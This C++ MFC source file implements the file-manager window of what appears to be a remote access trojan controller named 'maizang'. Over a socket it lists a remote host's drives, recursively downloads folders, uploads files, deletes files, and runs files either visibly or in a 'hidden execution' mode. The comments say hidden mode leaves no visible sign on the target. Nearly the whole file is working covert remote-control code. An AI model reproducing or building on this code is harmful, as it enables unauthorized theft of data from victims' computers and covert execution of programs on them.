// FileManage.cpp : implementation file
//

#include "stdafx.h"
#include "maizang.h"
#include "FileManage.h"

#ifdef _DEBUG
//#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFileManage dialog


CFileManage::CFileManage(CWnd* pParent /*=NULL*/)
	: CDialog(CFileManage::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileManage)
	//}}AFX_DATA_INIT
	m_CurrPath="";
	m_SendPath="";
	m_Buffer = new char[1536 * 1024];
}
CFileManage::~CFileManage()
{
	if(m_Buffer != NULL)
		delete []m_Buffer;
}

void CFileManage::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileManage)
	DDX_Control(pDX, IDC_FILELIST, m_FileList);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFileManage, CDialog)
	//{{AFX_MSG_MAP(CFileManage)
	//}}AFX_MSG_MA	
	ON_NOTIFY(NM_DBLCLK, IDC_FILELIST, &CFileManage::OnNMDblclkFilelist)
	ON_COMMAND(ID_UP, &CFileManage::OnUp)
	ON_COMMAND(ID_FILE_FRESH, &CFileManage::OnFileFresh)
	ON_COMMAND(ID_FILE_DOWNLOAD, &CFileManage::OnFileDownload)
	ON_COMMAND(ID_FILE_DELETE, &CFileManage::OnFileDelete)
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(ID_FILE_EXECUTE, &CFileManage::OnFileExecute)
	ON_COMMAND(ID_FILE_EXECUTE_HIDE, &CFileManage::OnFileExecuteHide)
	ON_COMMAND(ID_FILE_UPLOAD, &CFileManage::OnFileUpload)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManage message handlers

BOOL CFileManage::OnInitDialog() 
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_FILE), FALSE);
	CenterWindow();
	if ( !m_wndToolBar.CreateEx(this, TBSTYLE_FLAT | TBSTYLE_LIST ,   //工具栏的创建
		WS_CHILD | WS_VISIBLE	| CBRS_ALIGN_TOP |CBRS_GRIPPER | CBRS_TOOLTIPS ,
		CRect(2, 2, 0, 0)) || !m_wndToolBar.LoadToolBar(IDR_TOOLBAR_FILE))
	{
		return FALSE;
	}

	m_wndToolBar.LoadTrueColorToolBar(
		16,
		IDB_FileToolBarNormal,
		IDB_FileToolBarHot,
		IDB_FileToolBarDisable
		);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //自动填充到非客户区的位置
	VERIFY(m_wndToolBar.SetButtonText(0,"向上"));   
	VERIFY(m_wndToolBar.SetButtonText(1,"执行"));   
	VERIFY(m_wndToolBar.SetButtonText(2,"隐藏执行"));
	VERIFY(m_wndToolBar.SetButtonText(3,"删除"));
	VERIFY(m_wndToolBar.SetButtonText(4,"上传"));   
	VERIFY(m_wndToolBar.SetButtonText(5,"下载"));   
	VERIFY(m_wndToolBar.SetButtonText(6,"刷新"));  
	VERIFY(m_wndToolBar.SetButtonText(7,"刷新"));   

	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1100001);//状态栏的设置
	int strPartDim[2]= {400,-1};
	m_wndStatusBar.SetParts(2,strPartDim);


	m_FileList.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	//文件传输窗口中文件列表的初始化
	m_FileList.InsertColumn(0, ("文件名"), LVCFMT_LEFT, 100);
	m_FileList.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_FileList.InsertColumn(2, "大小", LVCFMT_LEFT, 90);
	m_FileList.InsertColumn(3, "修改时间", LVCFMT_LEFT, 130);

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

//让文件传输窗口显示状态信息标明属于哪台主机的文件列表 以及显示主机磁盘信息
void CFileManage::SetConnSocket(SOCKET socket)
{
	//客户端与服务端进行通信的套接字
	m_ConnSocket = socket ;
	sockaddr_in addr;
	int sz = sizeof(addr);
	//获取对端名称信息  通过返回值ret判定一些错误
	int ret = getpeername(m_ConnSocket, (sockaddr *)&addr, &sz); 

	CString OnlineIP;
	OnlineIP.Format("%s:%d",inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
	SetWindowText("文件管理" + OnlineIP);
	GetRootDrivers();
}

void CFileManage::GetRootDrivers()
{
	unsigned dwThreadId;
	m_hWorkThread =
		(HANDLE)_beginthreadex(NULL,				 
		0,					 
		ListDriver,  
		this,   
		0, 		 
		&dwThreadId);
	if(m_hWorkThread == NULL)
	{
		m_wndStatusBar.SetText("获取远程电脑磁盘信息失败", 0 ,0);
	}
	CloseHandle(m_hWorkThread);
}


unsigned  __stdcall  ListDriver(void * pParam)	
{
	CFileManage *This = (CFileManage*)pParam;  
	This->m_MsgHead.dwCmd = CMD_FILEDRIVER;
	This->m_MsgHead.dwSize = 0;
	if(!SendMsg(This->m_ConnSocket, This->m_Buffer, &This->m_MsgHead) || 
		!RecvMsg(This->m_ConnSocket, This->m_Buffer, &This->m_MsgHead)  ) 
	{
		This->m_wndStatusBar.SetText("通信失败!", 0, 0);	
		return 0;
	}

	if(This->m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		This->m_wndStatusBar.SetText("获取远程主机磁盘信息失败", 0, 0);
		return 0;
	}

	//显示远程磁盘
	This->m_FileList.DeleteAllItems();

	DWORD dwNum = This->m_MsgHead.dwSize /sizeof(DriverInfo);
	BYTE * m_DesBuf = (LPBYTE) (This->m_Buffer);
	LPDriverInfo pInfo = (LPDriverInfo) m_DesBuf;
	int iImage =0, iSelectedImage=0;

	for(DWORD i = 0; i < dwNum; i++)
	{
		//添加盘符
		switch(pInfo[i].drivertype)
		{
		case DRIVE_REMOVABLE:// 可移动驱动器
			{
				iImage        = 4;
				iSelectedImage= 4;
			}
			break;
		case DRIVE_REMOTE:   // 网络驱动器
			{
				iImage        = 6;
				iSelectedImage= 6;
			}
			break;
		case DRIVE_CDROM:    // CD-ROM
			{
				iImage        = 5;
				iSelectedImage= 5;
			}
			break;
		case DRIVE_FIXED:    // 固定的驱动器
			{
				iImage        = 3;
				iSelectedImage= 3;
			}
			break;
		default://不认识的类型跳过，不显示
			{
				pInfo[i].display[1]=0;	
			}
			break;
		}
		//Win2000会接收到一些错误的盘符
		if (strlen(pInfo[i].display) < 2)
			continue;
		int insertPos = This->m_FileList.GetItemCount();
		This->m_FileList.InsertItem(insertPos, pInfo[i].driver, NULL);
		This->m_FileList.SetItemData(insertPos, (DWORD)pInfo[i].driver[0]);
		This->m_FileList.SetItemText(insertPos,1,"磁盘");
	}

	This->m_wndStatusBar.SetText("获取远程磁盘成功", 0, 0);
	return 0;
}

unsigned  __stdcall ListFiles(void * pParam)
{
	CFileManage *This = (CFileManage*)pParam; 
	This->getFiles(This->m_SendPath, This->m_Buffer);

	//显示文件列表
	This->m_FileList.DeleteAllItems();
	DWORD dwNum = This->m_MsgHead.dwSize /sizeof(FileInfo);
	BYTE * m_DesBuf = (LPBYTE)(This->m_Buffer);
	LPFileInfo pInfo = (LPFileInfo) m_DesBuf;
	for(DWORD i = 0; i < dwNum; i++)
	{
		//显示时候，文件夹在上面，文件在下面
		int iIcon = 0, iInsertItem = 0;
		if(pInfo[i].iType == 2)//文件
		{
			iInsertItem =This->m_FileList.GetItemCount();				
		}
		if(pInfo[i].iType == 1)//文件夹
		{	
			strcpy(pInfo[i].cAttrib,"文件夹");
			iInsertItem = 0;
		}
		This->m_FileList.InsertItem(iInsertItem,pInfo[i].cFileName);
		This->m_FileList.SetItemData(iInsertItem,pInfo[i].iType);
		This->m_FileList.SetItemText(iInsertItem,0,pInfo[i].cFileName);
		This->m_FileList.SetItemText(iInsertItem,1,pInfo[i].cAttrib);
		This->m_FileList.SetItemText(iInsertItem,2,pInfo[i].cSize);
		This->m_FileList.SetItemText(iInsertItem,3,pInfo[i].cTime);
	}
	This->m_wndStatusBar.SetText("获取远程文件列表成功", 0, 0);
	CString str;
	str.Format("共有文件、文件夹 %d个", dwNum);
	This->m_wndStatusBar.SetText(str, 1, 0);
	return 0;
}

void CFileManage::OnNMDblclkFilelist(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);	
	// TODO: 在此添加控件通知处理程序代码
	POSITION pos = m_FileList.GetFirstSelectedItemPosition(); // todo
	if(pos == NULL) return ;
	int iCurrSel= m_FileList.GetNextSelectedItem(pos);
	int fileCategory = m_FileList.GetItemData(iCurrSel);
	if(fileCategory !=2 ){   //双击的是目录
		if(m_CurrPath == ""){
			if (fileCategory =='A' || fileCategory=='B')//A,B盘不处理
				return;
			m_CurrPath.Format("%c:",(char)fileCategory);
			m_SendPath = m_CurrPath + "\\*";
		}else{
			m_CurrPath = m_CurrPath + "\\" + m_FileList.GetItemText(iCurrSel,0);
			m_SendPath = m_CurrPath + "\\*";
		}
		getFilesByCurrPath();	
	}
	else{  //双击的是文件
		::MessageBox(NULL, "这是一个文件，请选中后选择下载","这是一个文件", MB_OK);
	}
	*pResult = 0;
}

void CFileManage::OnUp()
{
	// TODO: 在此添加命令处理程序代码
	int pos  =  m_CurrPath.ReverseFind('\\');
	if(pos == -1){
		m_CurrPath = "";
		m_SendPath = "";
		GetRootDrivers();
	}else{
		m_CurrPath = m_CurrPath.Left(pos);
		m_SendPath = m_CurrPath + "\\*";
		getFilesByCurrPath();	
	}
}


void CFileManage::getFilesByCurrPath(void)
{
	//列举目录线程
	unsigned dwThreadId;
	m_hWorkThread  =
		(HANDLE)_beginthreadex(NULL,				 
		0,					 
		ListFiles,  
		this,   
		0, 		 
		&dwThreadId);
	if (m_hWorkThread == NULL)
	{
		m_wndStatusBar.SetText("获取远程目录列表失败", 0, 0);
		m_CurrPath = "";
		m_SendPath = "";
	}
	CloseHandle(m_hWorkThread);
}


void CFileManage::OnFileFresh()
{
	// TODO: 在此添加命令处理程序代码
	getFilesByCurrPath();
}

CString CFileManage::chooseDirectory(){
	TCHAR           szFolderPath[MAX_PATH] = {0};  
	CString         strFolderPath = TEXT("");  
	BROWSEINFO      sInfo;  
	::ZeroMemory(&sInfo, sizeof(BROWSEINFO));  
	sInfo.pidlRoot   = 0;  
	sInfo.lpszTitle   = _T("请选择一个文件夹：");  
	sInfo.ulFlags   = BIF_DONTGOBELOWDOMAIN | BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE | BIF_EDITBOX;  
	sInfo.lpfn     = NULL;  

	// 显示文件夹选择对话框  
	LPITEMIDLIST lpidlBrowse = ::SHBrowseForFolder(&sInfo);   
	if (lpidlBrowse != NULL)  
	{  
		// 取得文件夹名  
		if (::SHGetPathFromIDList(lpidlBrowse,szFolderPath))    
		{  
			strFolderPath = szFolderPath;  
		}  
	}  
	if(lpidlBrowse != NULL)  
	{  
		::CoTaskMemFree(lpidlBrowse);  
	}  
	return strFolderPath; 
}
void CFileManage::OnFileDownload()
{
	// TODO: 在此添加命令处理程序代码
	unsigned dwThreadId;
	HANDLE handle =
		(HANDLE)_beginthreadex(NULL,				 
		0,					 
		downLoadThread,  
		this,   
		0, 		 
		&dwThreadId);
	if(handle == NULL)
	{
		m_wndStatusBar.SetText("下载失败", 0 ,0);
	}
	CloseHandle(handle);
}


unsigned  __stdcall downLoadThread(void * pParam)	{
	CFileManage *This = (CFileManage*)pParam; 
	CString savePath = This->chooseDirectory();
	POSITION pos = This->m_FileList.GetFirstSelectedItemPosition(); 
	while(pos){	
		int iCurrSel= This->m_FileList.GetNextSelectedItem(pos);
		int fileCategory = This->m_FileList.GetItemData(iCurrSel);
		if((fileCategory >= 'A' && fileCategory <= 'Z') || (fileCategory >= 'a' && fileCategory <= 'z')) {  //如果要求传送整个磁盘则不传送   磁盘一般有太多数据
			continue;
		}
		CString fileName = This->m_FileList.GetItemText(iCurrSel, 0);

		if(fileCategory !=2 ){   //是目录
			This->directoryDownload(This->m_CurrPath, savePath, fileName);
		}
		else{
			This->fileDownload(This->m_CurrPath, savePath ,fileName);
		}
		Sleep(200);
	}
	return 0 ;
}

void CFileManage::directoryDownload(CString remotePath, CString localPath, CString fileName){
	m_wndStatusBar.SetText(remotePath + "   文件夹下载中", 0, 0);
	remotePath = remotePath + "\\" + fileName;
	localPath = localPath + "\\" + fileName;
	createDirectory(localPath);
	char * pBuffer = new char[1024 * 1000];
	getFiles(remotePath + "\\*", pBuffer);
	//对该文件夹下的每个文件进行处理
	DWORD dwNum = m_MsgHead.dwSize /sizeof(FileInfo);
	BYTE * desBuf = (LPBYTE)(pBuffer);
	LPFileInfo pInfo = (LPFileInfo) desBuf;
	for(DWORD i = 0; i < dwNum; i++)
	{
		if(pInfo[i].iType == 2)//文件
		{
			fileDownload(remotePath, localPath, pInfo[i].cFileName); 
			Sleep(200);
		}
		if(pInfo[i].iType == 1)//文件夹
		{	
			directoryDownload(remotePath, localPath, pInfo[i].cFileName);
			Sleep(200);
		}
	}
	delete pBuffer;
	m_wndStatusBar.SetText(remotePath + "   文件夹下载成功", 0, 0);

}

void CFileManage::createDirectory(CString directoryPath){
	/*	if(PathIsDirectory(directoryPath) == FALSE || CreateDirectory(directoryPath,NULL) != 0)   
	{    
	m_wndStatusBar.SetText(directoryPath + "   文件夹创建成功", 0, 0);
	}  
	else
	{		
	if(AfxMessageBox("下载文件夹时发生错误！是否继续?",   MB_YESNO)   ==   IDYES)   
	return;
	}
	*/
	CreateDirectory(directoryPath,NULL);
}


void  CFileManage::getFiles(CString remotePath, char *pBuffer){
	//发送获取盘符命令
	m_MsgHead.dwCmd  = CMD_FILEDIRECTORY;
	m_MsgHead.dwSize = remotePath.GetLength();
	strcpy(pBuffer,remotePath);
	//数据传输同时接收数据
	if( !SendMsg(m_ConnSocket, pBuffer, &m_MsgHead) ||
		!RecvMsg(m_ConnSocket, pBuffer, &m_MsgHead))
	{
		//数据传输失败
		m_wndStatusBar.SetText("通信失败", 0, 0);
		return ;
	}
	if(m_MsgHead.dwCmd != CMD_SUCCEED)
	{
		//数据传输失败
		if(m_MsgHead.dwCmd == CMD_DIRFLODERERR)
		{
			m_CurrPath = "";
			m_wndStatusBar.SetText("目录不能访问", 0, 0); 
		}
		else
		{
			m_wndStatusBar.SetText("获取远程目录失败", 0, 0); 
			m_CurrPath = "";
		}
		return ;
	}
}


void CFileManage::fileDownload(CString remotePath, CString localPath, CString fileName){
	if(localPath.Find("objects")){
		m_MsgHead.dwCmd = CMD_GETFILE;
	}
	remotePath = remotePath + "\\" + fileName;
	localPath = localPath + "\\" + fileName;

	m_MsgHead.dwCmd = CMD_GETFILE;
	m_MsgHead.dwSize = remotePath.GetLength();
	if(!SendMsg(m_ConnSocket, (LPSTR)(LPCTSTR)remotePath, &m_MsgHead)  ) 
	{
		m_wndStatusBar.SetText("通信失败!", 0, 0);	
		return ;
	}
	CFile file(localPath, CFile::modeCreate | CFile::modeWrite);
	while(RecvMsg(m_ConnSocket, m_Buffer, &m_MsgHead)){
		if(m_MsgHead.dwCmd == 88)
		{
			::MessageBox(NULL, "该文件不存在或者无权限读取", remotePath ,MB_OK);
		}
		file.Write(m_Buffer, m_MsgHead.dwSize);
		if(m_MsgHead.dwSize < MAX_FILE_DATA_BUFFER_SIZE) break;
	}
	m_wndStatusBar.SetText(remotePath + "   下载成功", 0, 0);
	file.Close();
}


void CFileManage::OnFileDelete()
{
	// TODO: 在此添加命令处理程序代码
	POSITION pos = m_FileList.GetFirstSelectedItemPosition(); 	
	char * pBuffer = new char[1000];
	while(pos){	
		int iCurrSel= m_FileList.GetNextSelectedItem(pos);
		strcpy(pBuffer, m_CurrPath + "\\" + m_FileList.GetItemText(iCurrSel, 0));
		m_MsgHead.dwCmd = CMD_FILE_DELETE;
		m_MsgHead.dwSize = strlen(pBuffer);
		if(::MessageBox(NULL, pBuffer, "你确定要删除远程主机文件或文件夹？ 慎重！！！", MB_YESNO) == IDYES)
		{
			if(!SendMsg(m_ConnSocket, pBuffer, &m_MsgHead))
			{
				m_wndStatusBar.SetText("通信失败!", 0, 0);	
				return ;
			}
		}
	}
	OnFileFresh();
}


void CFileManage::OnRButtonDown(UINT nFlags, CPoint point)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CMenu menu;
	menu.LoadMenu(IDR_MENU_FILE);
	CMenu *pop = menu.GetSubMenu(0);
	ClientToScreen(&point);
	pop->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON,point.x,point.y,GetParent());

	CDialog::OnRButtonDown(nFlags, point);
}


void CFileManage::OnFileExecute()
{
     fileExecute(0); // 0表示正常运行不隐藏   运行时候会产生cmd窗口
}


void CFileManage::OnFileExecuteHide()
{
	// TODO: 在此添加命令处理程序代码
	fileExecute(1);   //1表示隐藏运行   运行时服务端无明显反应
}

void CFileManage::fileExecute(int hide){
	POSITION pos = m_FileList.GetFirstSelectedItemPosition(); 	
	char * pBuffer = new char[1000];
	while(pos){	
		int iCurrSel= m_FileList.GetNextSelectedItem(pos);
		int category = m_FileList.GetItemData(iCurrSel);
		strcpy(pBuffer,m_CurrPath + "\\" + m_FileList.GetItemText(iCurrSel,0));
		if(category != 2) {
			::MessageBox(NULL,pBuffer,"该文件不能执行！",MB_OK);
			continue;
		}
		m_MsgHead.dwCmd  = CMD_FILE_EXECUTE;
		m_MsgHead.dwSize = strlen(pBuffer);
		m_MsgHead.dwExtend1 = hide;//随便取一个大于0的值表示正常运行不隐藏
		//数据传输同时接收数据
		if( !SendMsg(m_ConnSocket, pBuffer, &m_MsgHead))
		{
			//数据传输失败
			m_wndStatusBar.SetText("通信失败", 0, 0);
			return ;
		}
	}
}


void CFileManage::OnFileUpload()
{
	// TODO: 在此添加命令处理程序代码
	CString localPath ;
	CFileDialog dlg(TRUE, //TRUE为OPEN对话框，FALSE为SAVE AS对话框
		NULL, 
		NULL,
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		(LPCTSTR)_TEXT("All Files (*.*)|*.*||"),
		NULL);
	if(dlg.DoModal()==IDOK)
	{
		localPath=dlg.GetPathName(); 
	}
	else
	{
		return;
	}
    if(GetFileAttributes(localPath)   !=   FILE_ATTRIBUTE_DIRECTORY) {
		sendFile(localPath);
	}
	else
	{
		::MessageBox(NULL, "文件夹不能上传", "文件夹不能上传", MB_OK);
	}
}



void CFileManage::sendFile(CString filePath){
	CFile file;
	CFileException fileException;
	try
	{
		file.Open(filePath, CFile::modeRead, &fileException);
	}
	catch (CFileException* e)
	{
		file.Close();
	}	
	if(file == INVALID_HANDLE_VALUE) return ;

	char* pFileData = new char[MAX_FILE_DATA_BUFFER_SIZE + 10];
	m_MsgHead.dwCmd = CMD_FILE_TO_CLIENT;
	int pos = filePath.ReverseFind('\\'); 
	CString fileName =  filePath.Right(filePath.GetLength() - pos -1);
	CString remotePath = m_CurrPath + "\\" + fileName;
	m_MsgHead.dwSize = remotePath.GetLength();
    SendMsg(m_ConnSocket, (LPSTR)(LPCTSTR)remotePath , &m_MsgHead);
	while(true){
		int readSize = file.Read(pFileData, MAX_FILE_DATA_BUFFER_SIZE);
		m_MsgHead.dwCmd = 0;
		m_MsgHead.dwSize = readSize;
		SendMsg(m_ConnSocket, pFileData, &m_MsgHead);
		if(readSize < MAX_FILE_DATA_BUFFER_SIZE) break;
	}
	delete pFileData;
	file.Close();
	OnFileFresh();
	return ;
}